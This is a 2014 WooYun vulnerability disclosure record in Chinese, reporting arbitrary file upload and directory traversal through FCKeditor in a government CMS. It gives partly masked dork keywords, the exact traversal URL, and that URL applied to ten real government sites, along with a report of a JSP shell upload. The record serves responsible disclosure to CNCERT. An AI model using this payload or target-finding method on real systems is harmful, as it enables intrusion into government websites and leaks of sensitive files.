{"id": 3311, "wybug_id": "wooyun-2014-054238", "wybug_title": "某政府类CMS通用任意文件上传+目录遍历", "wybug_corp": "Cncert国家互联网应急中心", "wybug_author": "U神", "wybug_date": "2014-03-28 12:58", "wybug_open_date": "2014-06-26 12:58", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向公众公开  简要描述：  详细说明：  #1.今天是改善Gov安全的第五课！------该CMS主要是存在一个JSP的Fckeditor导致了任意文件上传，并且毫无限制地存在目录遍历，想看什么就看什么~关键字比较难构造，如下：\ninurl:u***es inurl:index.jspinurl:do***?siteid\n#2.根据该关键字可以发现，存在大量的这样的政府网站~\n\n其漏洞主要表现在Fckeditor的编辑上，地址如下：\nfckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector\n以下枚举十例，【注意】仅提供给Cncert进行复现测试，其它人员请勿对提供的网站此进行利用或破坏，否则后果自负!：\nhttp://www.wuzhi.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://eqrsj.***.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://www.j***o.jcy.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://www.s***u.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://cjl.***i.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://www.***.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://www.e***k.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://***j.***i.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://www.***g.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connectorhttp://jsj.***i.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector\n以上十例主要都是市级以上的政府单位！所以要注意自己的举止！为防止漏洞被利用，请Cncert紧急通报以上说的十例先修复该漏洞！   漏洞证明：  #3.以最后一例子来做测试，我们看看Fck编辑器带来的危害！可泄漏大量敏感信息！危害可想而知！看下面的图，完全可以遍历网站所有目录内容，包括一些敏感的文件信息！\n\n#4.测试是否能成功上传JSP脚本，成功上传zone.jsp   修复方案：  PS:以上测试为证明漏洞危害，Shell已删除，请勿跨省，改善Gov安全，是我们白帽子的职责！原来我终于知道为什么中国那么多政府网会被外国黑客黑了！原来是这么简单！例如由某生产厂商提供自己写的CMS然后给批量的政府网安装，而该CMS存在一个漏洞导致所有网站沦陷！   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-01 22:27 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-28 13:01 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  眼熟……    \n     2014-03-28 13:09 |    \t\tHUC缘生 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:29        | 小白求罩~~~~)\t\t \n  妹子~~~~~~求细节~~~~~    \n     2014-03-28 13:13 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Coody 我以为不会审核了~没想到    \n     2014-03-28 13:24 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  FCKeditor这个还算不上通用软件漏洞，有很多是因为配置原因、使用不当造成的。    \n     2014-03-28 13:26 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @cncert国家互联网应急中心 也算是吧，但是它存在一个目录遍历，什么东西都可以看到，这个比较严重点    \n     2014-03-28 13:29 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  @U神 根据您找到的应用特征，我们在找后面的共同厂商，刚才想表达的是FCKeditor本身很常见，但如果该厂商在产品中封装且默认部署，那就是一个通用问题。    \n     2014-03-28 13:33 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @cncert国家互联网应急中心 哈哈~本来我也不想提交这个漏洞，因为FCK的比较常见，但是比较多的部署了这个，而且配置不当导致什么信息都泄漏，仔细看那张遍历目录的，（信息统计）这些敏感信息也泄漏~干脆马马虎虎提交了一下，上个礼拜提交的，我以为不审核了~没想到今天....不过有几个网站打开很慢，不知道怎么回事，我发誓我只测试过最后一例~    \n     2014-03-28 15:59 |    \t\tstudy_vul \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 我有乌云id了，我马上就要牛叉起来了)\t\t \n  牛    \n     2014-04-04 18:50 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  警告：以上提供示例和漏洞一方面是为证明漏洞存在，一方面是提供给Cncert测试真实性，其它人请勿恶意使用或破坏，否则后果自负！    \n     2014-04-22 09:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这给力了。居然type不做限制的FCK，什么版本啊……居然还有这种问题啊。    \n     2014-06-26 15:45 |    \t\tdbgger \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:9        | Nothing else...)\t\t \n  帽子扣的太大了,其实就是个fkc漏洞而已    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}